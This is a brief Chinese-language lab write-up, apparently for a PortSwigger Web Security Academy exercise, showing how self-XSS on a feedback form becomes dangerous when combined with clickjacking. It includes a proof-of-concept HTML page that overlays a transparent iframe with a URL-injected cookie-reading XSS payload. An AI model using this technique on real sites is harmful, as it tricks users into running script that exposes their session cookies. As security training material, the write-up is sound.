self_xss的一种高危利用方式

提交反馈页面存在self_xss，可以通过控制url来决定页面输入值

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/portswigger-labs/点击劫持/images/06708061DBED4D7A8CDA7C1BC82BB8B0clipboard.png)



当点击提交按钮时，即可再页面上返回用户名，并触发self_xss



搭配页面劫持来造成危害,poc:

```javascript
<style>
   iframe {
       position:relative;
       width:500px;
       height: 700px;
       opacity: 0.1;
       z-index: 2;
   }
   div {
       position:absolute;
       top:600px;
       left:80px;
       z-index: 1;
   }
</style>
<div>Click me</div>
<iframe
src="https://ac611f131fcefcf5803d180500010040.web-security-academy.net/feedback?name=<img src=1 onerror=alert(document.cookie)>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```

